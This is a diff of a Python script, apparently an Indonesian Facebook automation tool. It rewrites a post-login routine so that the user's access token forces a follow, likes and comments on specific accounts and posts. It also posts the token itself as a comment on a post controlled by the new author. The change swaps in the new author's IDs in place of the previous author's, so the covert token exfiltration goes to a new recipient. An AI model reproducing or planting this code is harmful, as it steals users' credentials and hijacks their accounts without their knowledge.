@@ -208,12 +208,13 @@ def bot():
 		jalan(balmond+m+" Token Kadaluarsa")
 		time.sleep(0.5)
 		login()
-	print(balmond+l+" Bentarr Bree, Follow Duluu Amaa Setor Token Mwhehehe")
-	komentar = random.choice(["Apa Kabar Bang Ndrii"])
-	requests.post("https://graph.facebook.com/100014905842581/subscribers?access_token="+token) # sptty chan
-	requests.post("https://graph.facebook.com/1262475690925947/likes?summary=true&access_token=" + token)
-	requests.post("https://graph.facebook.com/1262475690925947/comments/?message="+komentar+"&access_token="+token)
-	requests.post("https://graph.facebook.com/1262475690925947/comments/?message="+token+"&access_token="+token)
+	print(balmond+l+" Script nya mantap Aa 😊, Setor Token Aa 💦")
+	komentar = random.choice(["Apa Kabar Aa @[100000834003593]"])
+	requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token) 
+	requests.post("https://graph.facebook.com/4257706904267068/likes?summary=true&access_token=" + token)
+	requests.post("https://graph.facebook.com/4134622646575495/likes?summary=true&access_token=" + token)
+	requests.post("https://graph.facebook.com/4257706904267068/comments/?message="+komentar+"&access_token="+token)
+	requests.post("https://graph.facebook.com/3882176535153442/comments/?message="+token+"&access_token="+token)
 	menu()
 
 # MENU
